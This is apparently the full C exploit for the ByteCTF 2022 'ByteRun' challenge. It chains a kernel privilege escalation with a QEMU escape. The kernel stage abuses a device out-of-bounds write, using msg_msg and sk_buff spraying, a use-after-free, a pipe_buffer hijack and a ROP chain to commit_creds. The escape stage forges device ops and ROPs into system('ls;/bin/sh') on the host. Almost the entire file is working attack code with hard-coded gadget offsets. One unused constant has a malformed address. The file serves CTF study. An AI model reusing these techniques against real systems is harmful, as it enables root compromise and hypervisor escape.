#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <unistd.h>

#define PRIMARY_MSG_SIZE 0x1000
#define SECONDARY_MSG_SIZE 0x400

#define PRIMARY_MSG_TYPE 0x41
#define SECONDARY_MSG_TYPE 0x42
#define VICTIM_MSG_TYPE 0x1337
#define MSG_TAG 0xAAAAAAAA

#define SOCKET_NUM 8
#define SK_BUFF_NUM 128
#define PIPE_NUM 256
#define MSG_QUEUE_NUM 0x2000

#ifndef MSG_COPY
#define MSG_COPY 040000
#endif

#define ANON_PIPE_BUF_OPS 0xffffffff81e2d980
#define PREPARE_KERNEL_CRED 0xffffffff810bb9c04
#define INIT_CRED 0xffffffff8224aca0
#define COMMIT_CREDS 0xffffffff810bb710
#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81a01086
#define POP_RDI_RET 0xffffffff811af57d

#define BYTEDEV_BUF_SIZE (4096 - sizeof(struct bytedev_data))

#define BYTEDEV_MODE_CHANGE 0x114514
#define BYTEDEV_BLK_IDX_CHANGE 0x1919810

#define BYTEDEV_SECTOR_SIZE 512
#define BYTEDEV_SECTOR_NUM 256

#define LIBC_SYSTEM 0x52290
#define LIBC_MOV_RSP_RDX_RET 0x000000000005b4d0
#define LIBC_MOV_RDX_PTRRDIADD8_MOV_PTRRSP_RAX_CALL_PTRRDXADD0x20              \
    0x0000000000151990
#define LIBC_POP_RDI_RET 0x0000000000023b6a
#define LIBC_RET 0x0000000000023b6b
#define LIBC_BIN_SH 0x1b45bd
#define LIBC_PUTS 0x84420

enum BYTEDEV_MODE {
    BYTEDEV_MODE_STREAM = 0,
    BYTEDEV_MODE_BLK,
};

struct bytedev_data {
    unsigned short len, offset;
    char data[0];
};

struct list_head {
    uint64_t next;
    uint64_t prev;
};

struct msg_msg {
    struct list_head m_list;
    uint64_t m_type;
    uint64_t m_ts;
    uint64_t next;
    uint64_t security;
};

struct msg_msgseg {
    uint64_t next;
};

struct {
    long mtype;
    char mtext[PRIMARY_MSG_SIZE - sizeof(struct msg_msg)];
} primary_msg;

struct {
    long mtype;
    char mtext[SECONDARY_MSG_SIZE - sizeof(struct msg_msg)];
} secondary_msg;

/**
 * skb_shared_info need to take 320 bytes at the tail
 * so the max size of buf we should send is:
 * 1024 - 320 = 704
 */
char fake_second_msg[704];

struct {
    long mtype;
    char mtext[0x1000 - sizeof(struct msg_msg) + 0x1000 -
               sizeof(struct msg_msgseg)];
} oob_msg;

struct pipe_buffer {
    uint64_t page;
    uint32_t offset, len;
    uint64_t ops;
    uint32_t flags;
    uint32_t padding;
    uint64_t private;
};

struct pipe_buf_operations {
    uint64_t confirm;
    uint64_t release;
    uint64_t try_steal;
    uint64_t get;
};

size_t user_cs, user_ss, user_rflags, user_sp;

void saveStatus() {
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;");
    puts("\033[34m\033[1m[*] Status has been saved.\n\033[0m");
}

void errExit(char *msg) {
    printf("\033[31m\033[1m[x] Error: %s\033[0m\n", msg);
    exit(EXIT_FAILURE);
}

int readMsg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
    return msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, 0);
}

int writeMsg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
    *(long *)msgp = msgtyp;
    return msgsnd(msqid, msgp, msgsz - sizeof(long), 0);
}

int peekMsg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
    int __msgsz = msgsz - sizeof(long);
    return msgrcv(msqid, msgp, __msgsz, msgtyp, MSG_COPY | IPC_NOWAIT);
}

void buildMsg(struct msg_msg *msg, uint64_t m_list_next, uint64_t m_list_prev,
              uint64_t m_type, uint64_t m_ts, uint64_t next,
              uint64_t security) {
    msg->m_list.next = m_list_next;
    msg->m_list.prev = m_list_prev;
    msg->m_type = m_type;
    msg->m_ts = m_ts;
    msg->next = next;
    msg->security = security;
}

int spraySkBuff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size) {
    for (int i = 0; i < SOCKET_NUM; i++) {
        for (int j = 0; j < SK_BUFF_NUM; j++) {
            if (write(sk_socket[i][0], buf, size) < 0) {
                printf("[x] failed to spray %d sk_buff for %d socket!", j, i);
                return -1;
            }
        }
    }

    return 0;
}

int freeSkBuff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size) {
    for (int i = 0; i < SOCKET_NUM; i++) {
        for (int j = 0; j < SK_BUFF_NUM; j++) {
            if (read(sk_socket[i][1], buf, size) < 0) {
                puts("[x] failed to received sk_buff!");
                return -1;
            }
        }
    }

    return 0;
}

void trigerOutOfBoundWrite(int dev_fd, int socket_fd[2]) {
    struct bytedev_data *fake_data;
    char *trash_data;

    /* free the first buffer in bytedev queue */
    trash_data = malloc(BYTEDEV_BUF_SIZE);
    memset(trash_data, 0x84, BYTEDEV_BUF_SIZE);

    printf("[*] write %ld bytes to dev \n",
           write(dev_fd, trash_data, BYTEDEV_BUF_SIZE));
    printf("[*] read %ld bytes from dev\n",
           read(dev_fd, trash_data, BYTEDEV_BUF_SIZE));

    /* construct fake bytedev_data */
    fake_data = malloc(sizeof(struct bytedev_data) + BYTEDEV_BUF_SIZE);
    fake_data->len = BYTEDEV_BUF_SIZE + 1;

    puts("[*] re-get the buffer by sk_buff...");
    write(socket_fd[0], fake_data, BYTEDEV_BUF_SIZE - 320);

    /* make an OOB write */
    puts("[*] OOB write to nearby object...");
    write(dev_fd, trash_data, 1);

    /* to prevent the memory leaking */
    free(trash_data);
    free(fake_data);
}

void qemuEscape(void) {
    int dev_fd, ret;
    uint64_t buf[BYTEDEV_SECTOR_SIZE / sizeof(uint64_t)];
    uint64_t fake_ops[BYTEDEV_SECTOR_SIZE / sizeof(uint64_t)];
    uint64_t libc_base, opaque, byte_dev_pmio_read;

    if ((dev_fd = open("/dev/bytedev", O_RDWR)) < 0) {
        errExit("failed to open bytedev!");
    }

    ioctl(dev_fd, BYTEDEV_MODE_CHANGE, BYTEDEV_MODE_BLK);

    /**
     * SECTOR -23: container
     * XXX: in docker-built Ubuntu 22.04, we cannot leak libc there.
     *      [55] g_str_hash
     *      [56] g_str_equal
     * SECTOR -24: BYTEPCIDevState
     *      [27~34] name
     *      [35~] io_regions[PCI_NUM_REGIONS]
     * SECTOR -25: byte_dev_pmio_ops
     *      [0] byte_dev_pmio_read
     *      [1] byte_dev_pmio_write
     * SECTOR -355 &io_regions[PCI_NUM_REGIONS]
     *      SECTOR -352 MemoryRegion - mmio
     *          [4] opaque
     *          [9] ops
     *      SECTOR -347 MemoryRegion - pmio
     *          [4] opaque
     *          [9] ops
     * SECTOR -388
     *      [8] <g_str_hash>
     */

    /**
     * Step.I leak basic info
     */

    puts("");
    puts("\033[34m\033[1m[*] Step.I leak basic\033[0m");

    puts("\033[34m\033[1m[*] Reading from -388 sector...\033[0m");

    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, -388);
    read(dev_fd, buf, BYTEDEV_SECTOR_SIZE);

    if (buf[7] < 0x7f0000000000) {
        for (int i = 0; i < BYTEDEV_SECTOR_SIZE / sizeof(uint64_t); i++) {
            printf("[--data-dump--][%d] %lx\n", i, buf[i]);
        }
        errExit("failed to leak libc related ptr!");
    }

    /* This's the offset on the Ubuntu 22.04: GLIBC 2.35-0ubuntu3.1 */
    // printf("%lx\n", buf[7]);
    libc_base = buf[7] - 0x4385f0;

    printf("\033[32m\033[1m[+] Got libc_base: \033[0m%lx\n", libc_base);

    puts("\033[34m\033[1m[*] Reading from -25 sector...\033[0m");

    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, -25);
    read(dev_fd, fake_ops, BYTEDEV_SECTOR_SIZE);
    byte_dev_pmio_read = fake_ops[0];
    printf("\033[32m\033[1m[+] Got byte_dev_pmio_read: \033[0m%lx\n",
           byte_dev_pmio_read);

    puts("\033[34m\033[1m[*] Reading from -347 sector...\033[0m");
    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, -347);
    read(dev_fd, buf, 10 * sizeof(uint64_t));
    opaque = buf[4];
    printf("\033[32m\033[1m[+] Got opaque: \033[0m%lx\n", opaque);

    /**
     * Step.II construct fake pmio->ops
     * There we make the opaque.parent_obj.name the ops,
     * so that nothing will be effects
     */

    puts("");
    puts("\033[34m\033[1m[*] Step.II construct fake pmio->ops\033[0m");

    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, -24);
    read(dev_fd, buf, BYTEDEV_SECTOR_SIZE);

    /**
     * XXX: I used to put it on the buf[26] && buf[27],
     * but it'll be overwrite unexpectedly, so I put it further...
     *
     * Another problem is that when I test /bin/sh in docker locally,
     * the shell it provided is not an interactive one
     * (I can't type anything and nothing works after my typing).
     * The message it shows is :
     *      # sh: turning off NDELAY mode
     * But for some other qemu pwns, it comes the same message
     * with correct works. So I think the problem is not here, but where?
     * For the remote attacking, the problem seems not to be existed,
     * but the shell will be hang for a while before it starts working...
     */
    buf[33] = buf[34] = 0;
    strcpy((char *)&buf[33],
           "ls;/bin/sh"); // cat ./flag;gnome-calculator;/bin/sh");

    /* the new rdx starts there */
    buf[28] = libc_base + LIBC_POP_RDI_RET;
    buf[29] = opaque + 33 * 8; // libc_base + LIBC_BIN_SH;
    buf[30] = libc_base + LIBC_SYSTEM;
    // buf[31] =
    /**
     * [rdx + 20]
     * mov rsp, rdx ; ret
     */
    buf[32] = libc_base + LIBC_MOV_RSP_RDX_RET;

    /* the [rdi + 8] */
    buf[1] = opaque + 28 * 8;

    /* fake ops on bar space */
    for (int i = 0; i < 10; i++) {
        buf[50 + i] = fake_ops[i];
    }
    /**
     * mov rdx, qword ptr [rdi + 8] ; -> store the ptr in opaque[1]
     * mov qword ptr [rsp], rax ;
     * call qword ptr [rdx + 0x20]  -> another call
     */
    buf[51] =
        libc_base + LIBC_MOV_RDX_PTRRDIADD8_MOV_PTRRSP_RAX_CALL_PTRRDXADD0x20;

    write(dev_fd, buf, BYTEDEV_SECTOR_SIZE);

    puts("\033[32m\033[1m[+] Done!\033[0m");

    /**
     * Step.III change pmio->ops to fake ops on opaque
     */

    puts("");
    puts("\033[34m\033[1m[*] Step.III change pmio->ops to fake ops\033[0m");

    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, -347);
    read(dev_fd, buf, 10 * sizeof(uint64_t));

    buf[9] = opaque + 50 * 8;
    write(dev_fd, buf, 10 * sizeof(uint64_t));

    puts("\033[32m\033[1m[+] Done!\033[0m");

    /**
     * Step.IV trigger fake pmio->ops.read to escape
     * There we need to set opaque[1] to opaque.parent_obj.name
     * and do something wonderful there...
     */

    puts("");
    puts("\033[34m\033[1m[*] Step.IV trigger fake ops to escape\n\033[0m");

    // sleep(5);
    ioctl(dev_fd, BYTEDEV_MODE_CHANGE, *(size_t *)"arttnba3");
}

void getRootShell(void) {
    if (getuid()) {
        errExit("failed to gain the root!");
    }

    puts("\033[32m\033[1m[+] Succesfully gain the root privilege\033[0m");

    puts("\033[34m\033[1m\n[*] Now we come to Stage II - QEMU ESCAPE\033[0m\n");
    qemuEscape();

    puts("\033[32m\033[1m[+] trigerring root shell now...\033[0m\n");
    system("/bin/sh");
    exit(EXIT_SUCCESS);
}

int main(int argc, char **argv, char **envp) {
    int oob_socket[2];
    int sk_sockets[SOCKET_NUM][2];
    int pipe_fd[PIPE_NUM][2];
    int msqid[MSG_QUEUE_NUM];
    int victim_qid, real_qid;
    struct msg_msg *nearby_msg;
    struct msg_msg *nearby_msg_prim;
    struct pipe_buffer *pipe_buf_ptr;
    struct pipe_buf_operations *ops_ptr;
    uint64_t victim_addr;
    uint64_t kernel_base;
    uint64_t kernel_offset;
    uint64_t *rop_chain;
    int rop_idx;
    cpu_set_t cpu_set;
    int dev_fd;
    int ret;

    /**
     * Step.0
     * Initialization
     */
    puts("\033[32m\033[1m\n[+] ByteCTF 2022 - ByteRun - exploit \033[0m\n");
    puts("\033[34m\033[1m\n[*] Stage I - ROOT Privilege Escalation. \033[0m\n");

    /* basic resources alloc */
    saveStatus();

    if ((dev_fd = open("/dev/bytedev", O_RDWR)) < 0) {
        errExit("failed to open bytedev!");
    }

    if (socketpair(AF_UNIX, SOCK_STREAM, 0, oob_socket) < 0) {
        errExit("failed to create socket pair for OOB write!");
    }

    /* to run the exp on the specific core only */
    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    /* socket pairs to spray sk_buff */
    for (int i = 0; i < SOCKET_NUM; i++) {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sk_sockets[i]) < 0) {
            errExit("failed to create socket pair!");
        }
    }

    /**
     * Step.I
     * build msg_queue, spray primary and secondary msg_msg,
     * and use OOB write to construct the overlapping
     */
    puts("");
    puts("\033[34m\033[1m[*] Step.I spray msg_msg for overlapping obj\033[0m");

    puts("[*] Build message queue...");
    /* build 4096 message queue */
    for (int i = 0; i < MSG_QUEUE_NUM; i++) {
        if ((msqid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) < 0) {
            errExit("failed to create msg_queue!");
        }
    }

    puts("[*] Spray primary and secondary msg_msg...");

    memset(&primary_msg, 0, sizeof(primary_msg));
    memset(&secondary_msg, 0, sizeof(secondary_msg));

    /* spray primary and secondary message */
    for (int i = 0; i < MSG_QUEUE_NUM; i++) {
        *(int *)&primary_msg.mtext[0] = MSG_TAG;
        *(int *)&primary_msg.mtext[4] = i;

        ret = writeMsg(msqid[i], &primary_msg, sizeof(primary_msg),
                       PRIMARY_MSG_TYPE);
        if (ret < 0) {
            errExit("failed to send primary msg!");
        }

        *(int *)&secondary_msg.mtext[0] = MSG_TAG;
        *(int *)&secondary_msg.mtext[4] = i;

        ret = writeMsg(msqid[i], &secondary_msg, sizeof(secondary_msg),
                       SECONDARY_MSG_TYPE);
        if (ret < 0) {
            errExit("failed to send secondary msg!");
        }
    }

    /* create hole in primary msg_msg */
    puts("[*] Create holes in primary msg_msg...");
    for (int i = 0; i < MSG_QUEUE_NUM; i += 1024) {
        ret = readMsg(msqid[i], &primary_msg, sizeof(primary_msg),
                      PRIMARY_MSG_TYPE);
        if (ret < 0) {
            errExit("failed to receive primary msg!");
        }
    }

    /* triger off-by-null on primary msg_msg */
    puts("[*] Trigger OOB write to construct the overlapping...");
    trigerOutOfBoundWrite(dev_fd, oob_socket);

    /* find the queues that have the same secondary msg_msg */
    puts("[*] Checking whether succeeded to make overlapping...");
    victim_qid = real_qid = -1;
    for (int i = 0; i < MSG_QUEUE_NUM; i++) {
        /* the hole */
        if ((i % 256) == 0) {
            continue;
        }

        if (peekMsg(msqid[i], &secondary_msg, sizeof(secondary_msg), 1) < 0) {
            printf("[x] error qid: %d\n", i);
            errExit("failed to receive secondary msg!");
        }

        if (*(int *)&secondary_msg.mtext[0] != MSG_TAG) {
            errExit("failed to make corruption!");
        }

        if (*(int *)&secondary_msg.mtext[4] != i) {
            victim_qid = i;
            real_qid = *(int *)&secondary_msg.mtext[4];
            break;
        }
    }

    if (victim_qid < 0) {
        errExit("failed to make overlapping!");
    }

    printf("\033[32m\033[1m[+] victim qid:\033[0m %d ", victim_qid);
    printf("\033[32m\033[1m real qid: \033[0m %d\n", real_qid);

    /**
     * Step.II
     * construct UAF
     */
    puts("\n\033[34m\033[1m[*] Step.II construct UAF\033[0m");

    /* free the victim secondary msg_msg, then we get a UAF */
    ret = readMsg(msqid[real_qid], &secondary_msg, sizeof(secondary_msg),
                  SECONDARY_MSG_TYPE);
    if (ret < 0) {
        errExit("failed to receive secondary msg!");
    }

    puts("\033[32m\033[1m[+] UAF construction complete!\033[0m");

    /**
     * Step.III
     * spray sk_buff to leak msg_msg addr
     * construct fake msg_msg to leak addr of UAF obj
     */
    puts("");
    puts("\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m");

    /* spray sk_buff to construct fake msg_msg */
    puts("[*] spray sk_buff...");
    buildMsg((struct msg_msg *)fake_second_msg, *(uint64_t *)"arttnba3",
             *(uint64_t *)"arttnba3", VICTIM_MSG_TYPE,
             0x1000 - sizeof(struct msg_msg), 0, 0);
    ret = spraySkBuff(sk_sockets, fake_second_msg, sizeof(fake_second_msg));
    if (ret < 0) {
        errExit("failed to spray sk_buff!");
    }

    /* use fake msg_msg to read OOB */
    puts("[*] OOB read from victim msg_msg");
    if (peekMsg(msqid[victim_qid], &oob_msg, sizeof(oob_msg), 1) < 0)
        errExit("failed to read victim msg!");

    if (*(int *)&oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG) {
        errExit("failed to rehit the UAF object!");
    }

    nearby_msg = (struct msg_msg *)&oob_msg
                     .mtext[(SECONDARY_MSG_SIZE) - sizeof(struct msg_msg)];

    printf("\033[32m\033[1m[+] addr of primary msg of msg nearby victim: ");
    printf("\033[0m%lx\n", nearby_msg->m_list.prev);

    /**
     * release and re-spray sk_buff to construct fake msg_msg
     * so that we can make an arbitrary read on a primary msg_msg
     */
    if (freeSkBuff(sk_sockets, fake_second_msg, sizeof(fake_second_msg)) < 0) {
        errExit("failed to release sk_buff!");
    }

    buildMsg((struct msg_msg *)fake_second_msg, *(uint64_t *)"arttnba3",
             *(uint64_t *)"arttnba3", VICTIM_MSG_TYPE, sizeof(oob_msg.mtext),
             nearby_msg->m_list.prev - 8, 0);
    if (spraySkBuff(sk_sockets, fake_second_msg, sizeof(fake_second_msg)) < 0) {
        errExit("failed to spray sk_buff!");
    }

    puts("[*] arbitrary read on primary msg of msg nearby victim");
    if (peekMsg(msqid[victim_qid], &oob_msg, sizeof(oob_msg), 1) < 0) {
        errExit("failed to read victim msg!");
    }

    if (*(int *)&oob_msg.mtext[0x1000] != MSG_TAG) {
        errExit("failed to rehit the UAF object!");
    }

    /* cal the addr of UAF obj by the header we just read out */
    nearby_msg_prim =
        (struct msg_msg *)&oob_msg.mtext[0x1000 - sizeof(struct msg_msg)];
    victim_addr = nearby_msg_prim->m_list.next - 0x400;

    printf("\033[32m\033[1m[+] addr of msg next to victim: \033[0m%lx\n",
           nearby_msg_prim->m_list.next);
    printf("\033[32m\033[1m[+] addr of msg UAF object: \033[0m%lx\n",
           victim_addr);

    /**
     * Step.IV
     * fix the header of UAF obj and release it
     * spray pipe_buffer and leak the kernel base
     */
    puts("");
    puts("\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kbase\033[0m");

    /* re-construct the msg_msg to fix it */
    puts("[*] fixing the UAF obj as a msg_msg...");
    if (freeSkBuff(sk_sockets, fake_second_msg, sizeof(fake_second_msg)) < 0) {
        errExit("failed to release sk_buff!");
    }

    /**
     * XXX: we need to pass the check in lib/list_debug.c
     * what we used to not to pass there is
     * "prev->next == entry" && "next->prev == entry"
     * so a valid memory with [addr of entry] should be set there
     */
    memset(fake_second_msg, 0, sizeof(fake_second_msg));
    for (int i = 0; i < 0x50; i++) {
        ((size_t *)(fake_second_msg))[i] = victim_addr;
    }
    buildMsg((struct msg_msg *)fake_second_msg, victim_addr + 0x100,
             victim_addr + 0x100, VICTIM_MSG_TYPE,
             SECONDARY_MSG_SIZE - sizeof(struct msg_msg), 0, 0);
    if (spraySkBuff(sk_sockets, fake_second_msg, sizeof(fake_second_msg)) < 0) {
        errExit("failed to spray sk_buff!");
    }

    /* release UAF obj as secondary msg */
    puts("[*] release UAF obj in message queue...");
    ret = readMsg(msqid[victim_qid], &secondary_msg, sizeof(secondary_msg),
                  VICTIM_MSG_TYPE);
    if (ret < 0) {
        errExit("failed to receive secondary msg!");
    }

    /* spray pipe_buffer */
    puts("[*] spray pipe_buffer...");
    for (int i = 0; i < PIPE_NUM; i++) {
        if (pipe(pipe_fd[i]) < 0) {
            errExit("failed to create pipe!");
        }

        /* write something to activate the pipe */
        if (write(pipe_fd[i][1], "arttnba3", 8) < 0) {
            errExit("failed to write the pipe!");
        }
    }

    /* release the sk_buff to read pipe_buffer, leak kernel base */
    puts("[*] release sk_buff to read pipe_buffer...");
    pipe_buf_ptr = (struct pipe_buffer *)&fake_second_msg;
    for (int i = 0; i < SOCKET_NUM; i++) {
        for (int j = 0; j < SK_BUFF_NUM; j++) {
            ret = read(sk_sockets[i][1], &fake_second_msg,
                       sizeof(fake_second_msg));
            if (ret < 0) {
                errExit("failed to release sk_buff!");
            }

            if (pipe_buf_ptr->ops > 0xffffffff81000000) {
                printf("\033[32m\033[1m[+] got anon_pipe_buf_ops:\033[0m%lx\n",
                       pipe_buf_ptr->ops);
                kernel_offset = pipe_buf_ptr->ops - ANON_PIPE_BUF_OPS;
                kernel_base = 0xffffffff81000000 + kernel_offset;
            }
        }
    }

    printf("\033[32m\033[1m[+] kernel base: \033[0m%lx  ", kernel_base);
    printf("\033[32m\033[1moffset: \033[0m%lx\n", kernel_offset);

    /**
     * Step.V
     * hijack the ops of pipe_buffer
     * free all pipe to trigger fake ptr
     * so that we hijack the RIP
     * construct a ROP on pipe_buffer
     */
    puts("");
    puts("\033[34m\033[1m[*] Step.V hijack the ops of pipe to root\033[0m");

    puts("[*] pre-construct data in userspace...");
    pipe_buf_ptr = (struct pipe_buffer *)fake_second_msg;
    pipe_buf_ptr->ops = victim_addr;

    ops_ptr = (struct pipe_buf_operations *)fake_second_msg;
    /* push rsi ; pop rsp ; pop rbx ; pop r12 ; ret */
    ops_ptr->release = 0xffffffff8133151b + kernel_offset;
    /* ret */
    ops_ptr->get = 0xffffffff81331534 + kernel_offset;

    rop_idx = 0;
    rop_chain = (uint64_t *)&fake_second_msg[0x20];
    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;
    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;
    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;
    rop_chain[rop_idx++] =
        kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE;
    rop_chain[rop_idx++] = *(uint64_t *)"arttnba3";
    rop_chain[rop_idx++] = *(uint64_t *)"arttnba3";
    rop_chain[rop_idx++] = (size_t)getRootShell;
    rop_chain[rop_idx++] = user_cs;
    rop_chain[rop_idx++] = user_rflags;
    rop_chain[rop_idx++] = user_sp;
    rop_chain[rop_idx++] = user_ss;

    puts("[*] spray sk_buff to hijack pipe_buffer...");
    if (spraySkBuff(sk_sockets, fake_second_msg, sizeof(fake_second_msg)) < 0) {
        errExit("failed to spray sk_buff!");
    }

    puts("[*] trigger fake ops->release to hijack RIP...");
    // sleep(5);
    for (int i = 0; i < PIPE_NUM; i++) {
        close(pipe_fd[i][0]);
        close(pipe_fd[i][1]);
    }

    return 0;
}
